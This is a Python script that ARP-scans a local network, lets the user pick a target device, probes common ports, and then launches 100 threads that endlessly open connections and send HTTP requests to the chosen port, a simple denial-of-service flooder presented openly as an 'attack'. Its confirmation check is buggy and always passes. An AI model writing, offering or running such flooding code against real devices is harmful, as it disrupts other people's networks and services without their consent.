import socket as s
import scapy.all as scapy
from tabulate import tabulate
import time
import threading

def scan_network(network_range):
    request = scapy.ARP(pdst=network_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request

    answered = scapy.srp(packet, timeout=1, verbose=0)[0]

    devices = []
    for _, response in answered:
        ip = response.psrc
        mac = response.hwsrc

        try:
            hostname = s.gethostbyaddr(ip)[0]
        except s.herror:
            hostname = "Unknown"

        if hostname == ip:
            hostname = "Unknown"

        devices.append((hostname, ip, mac))

    return devices


network = "192.168.1.0/24"
known_devices = []

scan_time = 5
start = time.time()

print(f"Scanning for {scan_time} seconds...\n")

while time.time() - start < scan_time:
    current_scan = scan_network(network)

    for device in current_scan:
        if device not in known_devices:
            known_devices.append(device)

    time.sleep(1)

print("Scan finished.\n")

indexed_devices = [
    (i + 1, device[0], device[1], device[2])
    for i, device in enumerate(known_devices)
]

print()
while True:
    print(tabulate(indexed_devices,
               headers=["#", "Hostname", "IP", "MAC"],
               tablefmt="grid"))

    target = int(input("Please, choose the target device:\n"))
    print()
    target_device = known_devices[target - 1]
    print(f"Device name: {target_device[0]}\nAddress IP: {target_device[1]}")
    answer = input(f"Are you sure {target_device[0]} is the right target? n or y\n")
    if answer == "Y" or "y":
        break
    else:
        continue

print()

target_ip = target_device[1]

def scan_ports(ip, ports):
    open_ports = []

    for port in ports:
        sock = s.socket(s.AF_INET, s.SOCK_STREAM)
        sock.settimeout(0.3)

        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)

        sock.close()

    return open_ports

print(f"Scanning ports on {target_ip}...\n")

common_ports = [21, 22, 23, 53, 80, 443, 445, 3389]

open_ports = scan_ports(target_ip, common_ports)

def attack():
    while True:
        x = s.socket(s.AF_INET, s.SOCK_STREAM)
        x.connect((target_ip, target_port))
        x.sendto(b"GET / HTTP/1.1\r\nHost: target_ip\r\n\r\n", (target_ip, target_port))
        x.close()


if open_ports:
    print("Open ports found:")
    for p in open_ports:
        print(f" - {p}")
    target_port = int(input("What port do we choose?"))
    for i in range(100):
        thread = threading.Thread(target=attack)
        thread.start()
else:
    print("No open ports detected.")





